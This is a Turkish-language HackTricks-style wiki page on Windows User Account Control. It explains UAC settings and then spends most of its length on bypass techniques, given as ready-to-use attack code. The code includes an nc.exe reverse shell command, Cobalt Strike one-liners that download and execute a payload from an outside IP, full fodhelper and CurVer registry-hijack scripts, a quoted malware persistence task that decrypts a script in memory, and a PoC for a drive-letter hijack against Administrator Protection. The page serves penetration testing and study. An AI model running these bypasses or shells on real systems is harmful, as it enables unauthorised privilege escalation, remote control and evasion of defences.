# UAC - User Account Control

{{#include ../../banners/hacktricks-training.md}}

## UAC

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) yükseltilmiş işlemler için bir **onay istemi (consent prompt)** sağlayan bir özelliktir. Uygulamaların farklı `integrity` seviyeleri vardır ve **yüksek seviye**ye sahip bir program, **sistemi potansiyel olarak tehlikeye atabilecek** görevleri yerine getirebilir. UAC etkin olduğunda, uygulamalar ve görevler, bir yönetici bu uygulama/görevlere yönetici düzeyinde erişim vermediği sürece her zaman **bir yönetici olmayan hesabın güvenlik bağlamı altında çalışır**. Bu, yöneticileri istemeden yapılan değişikliklerden koruyan bir kolaylık özelliğidir fakat bir güvenlik sınırı olarak kabul edilmez.

integrity seviyeleri hakkında daha fazla bilgi için:


{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

UAC etkin olduğunda, bir yönetici kullanıcıya 2 token verilir: normal işlemleri yapmak için bir standart kullanıcı anahtarı ve yönetici ayrıcalıklarını içeren bir token.

Bu [sayfa](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) UAC'nin nasıl çalıştığını ayrıntılı olarak tartışır ve oturum açma sürecini, kullanıcı deneyimini ve UAC mimarisini içerir. Yöneticiler, UAC'nin kuruluşlarına özgü nasıl çalışacağını yerel düzeyde (secpol.msc kullanarak) yapılandırmak için güvenlik ilkelerini kullanabilir veya Active Directory domain ortamında Group Policy Objects (GPO) aracılığıyla yapılandırıp dağıtabilirler. Çeşitli ayarlar detaylı olarak [burada](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings) tartışılmaktadır. UAC için ayarlanabilecek 10 Group Policy ayarı vardır. Aşağıdaki tablo ek bilgi sağlar:

| Group Policy Ayarı                                                                                                                                                                                                                                                                                                                                                           | Kayıt Defteri Anahtarı                | Varsayılan Ayar                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | ------------------------------------- | ------------------------------------------------------------ |
| [User Account Control: Admin Approval Mode for the built-in Administrator account](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                                                                           | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`   | `0` (Disabled)                                             |
| [User Account Control: Behavior of the elevation prompt for administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` | `5` (Prompt for consent for non-Windows binaries on the secure desktop) |
| [User Account Control: Behavior of the elevation prompt for standard users](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorUser`  | `1` (Prompt for credentials on the secure desktop)         |
| [User Account Control: Detect application installations and prompt for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                                                                 | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableInstallerDetection`   | `1` (Enabled; disabled by default on Enterprise)           |
| [User Account Control: Only elevate executables that are signed and validated](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ValidateAdminCodeSignatures` | `0` (Disabled)                                             |
| [User Account Control: Only elevate UIAccess applications that are installed in secure locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableSecureUIAPaths`       | `1` (Enabled)                                              |
| [User Account Control: Run all administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                                                                            | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA`                  | `1` (Enabled)                                              |
| [User Account Control: Allow UIAccess applications to prompt for elevation without using the secure desktop](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop)                                   | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableUIADesktopToggle`     | `0` (Disabled)                                             |
| [User Account Control: Switch to the secure desktop when prompting for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                                               | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\PromptOnSecureDesktop`      | `1` (Enabled)                                              |
| [User Account Control: Virtualize file and registry write failures to per-user locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableVirtualization`       | `1` (Enabled)                                              |

### Policies for installing software on Windows

Varsayılan olarak **yerel güvenlik ilkeleri** (çoğu sistemde "secpol.msc") **yönetici olmayan kullanıcıların yazılım yüklemesini engelleyecek** şekilde yapılandırılmıştır. Bu, bir yönetici olmayan kullanıcının yazılımınızın yükleyicisini indirebilse bile, yönetici hesabı olmadan çalıştıramayacağı anlamına gelir.

### Registry Keys to Force UAC to Ask for Elevation

Yönetici hakları olmayan standart bir kullanıcı olarak, belirli eylemleri gerçekleştirmeye çalıştığında UAC'nin "standart" hesabı **kimlik bilgileri istemesi**ni sağlayabilirsiniz. Bu işlem, belirli **kayıt defteri anahtarlarını** değiştirmeyi gerektirir ve bunlar için yönetici izinlerine ihtiyaç vardır; ta ki bir **UAC bypass** olmadıkça veya saldırgan zaten yönetici olarak oturum açmamışsa.

Kullanıcı **Administrators** grubunda olsa bile, bu değişiklikler kullanıcının yönetici işlemleri gerçekleştirmek için **hesap kimlik bilgilerini yeniden girmesini** zorunlu kılar.

**Tek dezavantajı, bu yöntemin çalışması için UAC'nin devre dışı bırakılmasını gerektirmesidir; bu, üretim ortamlarında muhtemel değildir.**

Değiştirmeniz gereken kayıt defteri anahtarları ve girdileri aşağıdaki gibidir (parantez içindeki değerler varsayılanlardır):

- `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`:
- `ConsentPromptBehaviorUser` = 1 (3)
- `ConsentPromptBehaviorAdmin` = 1 (5)
- `PromptOnSecureDesktop` = 1 (1)

Bu, Yerel Güvenlik İlkesi (secpol.msc) aracıyla manuel olarak da yapılabilir. Değiştirildikten sonra, yönetici işlemleri kullanıcının kimlik bilgilerini yeniden girmesini ister.

### Note

**User Account Control bir güvenlik sınırı değildir.** Bu nedenle, standart kullanıcılar local privilege escalation exploit olmadan hesaplarından çıkarak yönetici hakları elde edemezler.

### Ask for 'full computer access' to a user
```powershell
hostname | Set-Clipboard
Enable-PSRemoting -SkipNetworkProfileCheck -Force

cd C:\Users\hacedorderanas\Desktop
New-PSSession -Name "Case ID: 1527846" -ComputerName hostname
Enter-PSSession -ComputerName hostname
```
### UAC Ayrıcalıkları

- Internet Explorer Protected Mode, yüksek bütünlük düzeyindeki süreçlerin (ör. web tarayıcıları) düşük bütünlük düzeyindeki verilere (ör. geçici Internet dosyaları klasörü) erişmesini önlemek için bütünlük kontrolleri kullanır. Bu, tarayıcının düşük-bütünlük token'ı ile çalıştırılmasıyla sağlanır. Tarayıcı düşük bütünlük bölgesinde saklanan verilere erişmeye çalıştığında işletim sistemi sürecin bütünlük düzeyini kontrol eder ve erişime göre izin verir. Bu özellik, remote code execution saldırılarının sistemdeki hassas verilere erişmesini engellemeye yardımcı olur.
- Bir kullanıcı Windows'a oturum açtığında sistem, kullanıcının ayrıcalıklarının bir listesini içeren bir erişim belirteci oluşturur. Ayrıcalıklar, bir kullanıcının hakları ve yeteneklerinin birleşimi olarak tanımlanır. Belirteç ayrıca kullanıcının bilgisayara ve ağ üzerindeki kaynaklara kimlik doğrulaması için kullanılan kimlik bilgilerini içeren bir liste içerir.

### Autoadminlogon

Windows'u belirli bir kullanıcının sistem başlangıcında otomatik olarak oturum açması için yapılandırmak istiyorsanız **`AutoAdminLogon` registry key** değerini ayarlayın. Bu, kiosk ortamları veya test amaçları için kullanışlıdır. Parolayı kayıt defterinde açığa çıkardığı için yalnızca güvenli sistemlerde kullanın.

Kayıt Defteri Düzenleyicisi veya `reg add` kullanarak aşağıdaki anahtarları ayarlayın:

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`:
- `AutoAdminLogon` = 1
- `DefaultUsername` = username
- `DefaultPassword` = password

Normal oturum açma davranışına geri dönmek için `AutoAdminLogon` değerini 0 yapın.

## UAC bypass

> [!TIP]
> Grafiksel olarak hedefe erişiminiz varsa, UAC bypass çok basittir; UAC istemi göründüğünde basitçe "Yes" düğmesine tıklayabilirsiniz

UAC bypass şu durumda gereklidir: **UAC etkin, süreciniz orta bütünlük bağlamında çalışıyor ve kullanıcınız administrators grubuna ait.**

Belirtmek gerekir ki **UAC en yüksek güvenlik seviyesindeyse (Always) diğer seviyelerdeki (Default) durumlara göre atlatmak çok daha zordur.**

### UAC devre dışı

Eğer UAC zaten devre dışıysa (`ConsentPromptBehaviorAdmin` **`0`**) şu gibi bir şey kullanarak **admin ayrıcalıklarıyla bir reverse shell çalıştırabilirsiniz** (yüksek bütünlük düzeyi):
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### UAC bypass with token duplication

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **Çok** Temel UAC "bypass" (tam dosya sistemi erişimi)

Eğer Administrators grubunun üyesi bir kullanıcıyla shell'iniz varsa, SMB üzerinden paylaşılan **C$'i yerel olarak yeni bir diske bağlayabilir** ve **dosya sistemi içindeki her şeye erişim** elde edebilirsiniz (hatta Administrator kullanıcısının ana klasörüne bile).

> [!WARNING]
> **Görünüşe göre bu hile artık çalışmıyor**
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### UAC bypass with cobalt strike

Cobalt Strike teknikleri, UAC en yüksek güvenlik seviyesine ayarlı değilse çalışır.
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** ve **Metasploit** ayrıca **UAC**'yi **bypass** etmek için birkaç modüle de sahiptir.

### KRBUACBypass

Dokümantasyon ve araç: [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### UAC bypass exploits

[**UACME**](https://github.com/hfiref0x/UACME) birkaç UAC bypass exploits'in bir **derlemesidir**. UACME'yi **Visual Studio veya msbuild kullanarak derlemeniz gerektiğini** unutmayın. Derleme birkaç yürütülebilir dosya oluşturacaktır (ör. `Source\Akagi\outout\x64\Debug\Akagi.exe`), hangi dosyaya ihtiyacınız olduğunu **bilmeniz gerekecek.**\
**Dikkatli olun** çünkü bazı bypass'lar bazı diğer programları **uyarı penceresi göstermeye zorlayabilir**; bu da **kullanıcı**yı **uyarıp** bir şeylerin olduğunu fark etmesine neden olabilir.

UACME, her tekniğin hangi **build** sürümünden itibaren çalışmaya başladığını belirten bilgiyi içerir. Sürümlerinizi etkileyen bir teknik arayabilirsiniz:
```powershell
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
Ayrıca, [this](https://en.wikipedia.org/wiki/Windows_10_version_history) sayfasını kullanarak build sürümlerinden Windows sürümü `1607`'yi elde edebilirsiniz.

### UAC Bypass – fodhelper.exe (Registry hijack)

Güvenilir ikili dosya `fodhelper.exe`, modern Windows sürümlerinde otomatik olarak yükseltilir. Başlatıldığında, `DelegateExecute` verb'ünü doğrulamadan aşağıdaki per-user kayıt defteri yolunu sorgular. Oraya bir komut yerleştirmek, bir Medium Integrity işleminin (kullanıcı Administrators grubundaysa) UAC istemi olmadan bir High Integrity süreci başlatmasına olanak sağlar.

Registry path queried by fodhelper:
```text
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
<details>
<summary>PowerShell adımları (payload'unuzu ayarlayın, sonra trigger'ı çalıştırın)</summary>
```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```
</details>
Notlar:
- Geçerli kullanıcı Administrators üyesi olduğunda ve UAC seviyesi varsayılan/gevşek olduğunda çalışır (ek kısıtlamalar içeren Always Notify değil).
- 64-bit Windows'ta 32-bit bir süreçten 64-bit `PowerShell` başlatmak için `sysnative` yolunu kullanın.
- Payload herhangi bir komut olabilir (`PowerShell`, `cmd` veya bir EXE yolu). Gizli kalmak için UIs/istem pencereleri açmaktan kaçının.

#### CurVer/extension hijack varyantı (sadece HKCU)

Son örnekler `fodhelper.exe`'yi suistimal ederken `DelegateExecute`'ten kaçınıyor ve bunun yerine kullanıcıya özel `CurVer` değeri aracılığıyla **`ms-settings` ProgID'sini yönlendiriyorlar**. Otomatik yükseltilen binary hâlâ handler'ı `HKCU` altında çözüyor, bu yüzden anahtarları eklemek için admin token gerekmez:
```powershell
# Point ms-settings to a custom extension (.thm) and map that extension to our payload
New-Item -Path "HKCU:\Software\Classes\.thm\Shell\Open" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\.thm\Shell\Open\command" -Name "(default)" -Value "C:\\ProgramData\\rKXujm.exe" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings" -Name "CurVer" -Value ".thm" -Force

Start-Process "C:\\Windows\\System32\\fodhelper.exe"   # auto-elevates and runs rKXujm.exe
```
Yükseltildikten sonra, malware genellikle `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` değerini `0` olarak ayarlayarak **gelecekteki istemleri devre dışı bırakır**, ardından ek defense evasion (ör. `Add-MpPreference -ExclusionPath C:\ProgramData`) gerçekleştirir ve yüksek bütünlük düzeyinde çalışmak için persistence'i yeniden oluşturur. Tipik bir persistence görevi diske bir **XOR-encrypted PowerShell script** kaydeder ve her saat içinde onu bellek içinde çözüp/çalıştırır:
```powershell
schtasks /create /sc hourly /tn "OneDrive Startup Task" /rl highest /tr "cmd /c powershell -w hidden $d=[IO.File]::ReadAllBytes('C:\ProgramData\VljE\zVJs.ps1');$k=[Text.Encoding]::UTF8.GetBytes('Q');for($i=0;$i -lt $d.Length;$i++){$d[$i]=$d[$i]-bxor$k[$i%$k.Length]};iex ([Text.Encoding]::UTF8.GetString($d))"
```
Bu varyant hala dropper'ı temizler ve sadece staged payloads'ları bırakır; tespiti, **`CurVer` hijack**'i, `ConsentPromptBehaviorAdmin` tahrifatını, Defender istisnası oluşturulmasını veya PowerShell'i in-memory decrypt eden zamanlanmış görevleri izlemeye bırakır.

#### More UAC bypass

**All** burada kullanılan AUC'yi baypas etme teknikleri **tam bir etkileşimli shell** gerektirir (basit bir nc.exe shell yeterli değildir).

Bir **meterpreter** oturumu kullanarak elde edebilirsiniz. **Session** değeri **1** olan bir **process**'e migrate edin:

![](<../../images/image (863).png>)

(_explorer.exe_ çalışmalıdır)

### UAC Bypass with GUI

Bir **GUI**'ye erişiminiz varsa, UAC prompt'u aldığınızda **sadece kabul edebilirsiniz**, gerçekten bir bypass'a ihtiyacınız yoktur. Yani bir GUI'ye erişim sağlamak UAC'yi atlamanıza izin verir.

Ayrıca, birinin kullandığı (örneğin RDP ile) bir GUI oturumu elde ederseniz, **yönetici olarak çalışacak bazı araçlar** bulunabilir; bunlardan doğrudan **cmd** gibi bir şeyi **as admin** olarak UAC isteği olmadan çalıştırabilirsiniz, örneğin [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Bu biraz daha **stealthy** olabilir.

### Gürültülü brute-force UAC bypass

Gürültü olmasını umursamıyorsanız her zaman [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin) gibi bir şeyi çalıştırabilirsiniz; bu, kullanıcı kabul edene kadar izin yükseltme istemeye **devam eder**.

### Your own bypass - Basic UAC bypass methodology

UACME'ye bakarsanız, çoğu UAC bypass'ının bir Dll Hijacking zafiyetinden **istifade ettiğini** (çoğunlukla kötü amaçlı dll'yi _C:\Windows\System32_ içine yazmak) fark edeceksiniz. [Read this to learn how to find a Dll Hijacking vulnerability](../windows-local-privilege-escalation/dll-hijacking/index.html).

1. Autoelevate olacak bir binary bulun (çalıştırıldığında yüksek integrity level'da çalıştığını kontrol edin).
2. procmon ile **"NAME NOT FOUND"** olaylarını bulun; bunlar **DLL Hijacking** için savunmasız olabilir.
3. Muhtemelen bazı **korumalı yolların** (ör. C:\Windows\System32) içine DLL yazmanız gerekecek; buralara yazma izniniz yoktur. Bunu aşağıdakilerle atlatabilirsiniz:
   1. **wusa.exe**: Windows 7,8 ve 8.1. Bir CAB dosyasının içeriğini korumalı yolların içine çıkarmaya izin verir (çünkü bu araç yüksek integrity level'da çalıştırılır).
   2. **IFileOperation**: Windows 10.
4. DLL'inizi korumalı yola kopyalayıp savunmasız ve autoelevated binary'yi çalıştırmak için bir **script** hazırlayın.

### Another UAC bypass technique

Bu teknik, bir **autoElevated binary**'nin registry'den çalıştırılacak bir binary ya da komutun **isim/yol**unu **okumaya** çalışıp çalışmadığını izlemeye dayanır (binary bu bilgiyi özellikle **HKCU** içinde arıyorsa daha ilginçtir).

### Administrator Protection (25H2) drive-letter hijack via per-logon-session DOS device map

Windows 11 25H2 “Administrator Protection”, per-session `\Sessions\0\DosDevices/<LUID>` haritaları olan shadow-admin token'ları kullanır. Dizin, ilk `\??` çözümlemesinde `SeGetTokenDeviceMap` tarafından tembel olarak oluşturulur. Eğer saldırgan shadow-admin token'ını sadece **SecurityIdentification**'da taklit ederse, dizin saldırganı **owner** olarak oluşturulur (`CREATOR OWNER` miras alır), bu da `\GLOBAL??` üzerinde öncelik alan sürücü harfleri linklerinin oluşturulmasına izin verir.

**Adımlar:**

1. Düşük ayrıcalıklı bir oturumdan, promptless shadow-admin `runonce.exe` spawn etmek için `RAiProcessRunOnce` çağırın.
2. Bunun primary token'ını bir **identification** token'a duplicate edip impersonate ederek `\??`'yı açarken `\Sessions\0\DosDevices/<LUID>` dizininin saldırgan sahipliğinde oluşturulmasını zorlayın.
3. Orada saldırgan kontrollü depolamaya işaret eden bir `C:` symlink'i oluşturun; o oturumdaki sonraki dosya sistemi erişimleri `C:`'yi saldırgan yoluna çözecek ve prompt olmadan DLL/dosya hijack'e olanak sağlayacaktır.

**PowerShell PoC (NtObjectManager):**
```powershell
$pid = Invoke-RAiProcessRunOnce
$p = Get-Process -Id $pid
$t = Get-NtToken -Process $p
$id = New-NtTokenDuplicate -Token $t -ImpersonationLevel Identification
Invoke-NtToken $id -ImpersonationLevel Identification { Get-NtDirectory "\??" | Out-Null }
$auth = Get-NtTokenId -Authentication -Token $id
New-NtSymbolicLink "\Sessions\0\DosDevices/$auth/C:" "\??\\C:\\Users\\attacker\\loot"
```
## Referanslar
- [HTB: Rainbow – SEH overflow to RCE over HTTP (0xdf) – fodhelper UAC bypass adımları](https://0xdf.gitlab.io/2025/08/07/htb-rainbow.html)
- [LOLBAS: Fodhelper.exe](https://lolbas-project.github.io/lolbas/Binaries/Fodhelper/)
- [Microsoft Docs – User Account Control nasıl çalışır](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [UACME – UAC bypass teknikleri koleksiyonu](https://github.com/hfiref0x/UACME)
- [Checkpoint Research – KONNI, PowerShell arka kapıları üretmek için AI kullanıyor](https://research.checkpoint.com/2026/konni-targets-developers-with-ai-malware/)
- [Project Zero – Windows Administrator Protection drive-letter hijack](https://projectzero.google/2026/26/windows-administrator-protection.html)

{{#include ../../banners/hacktricks-training.md}}
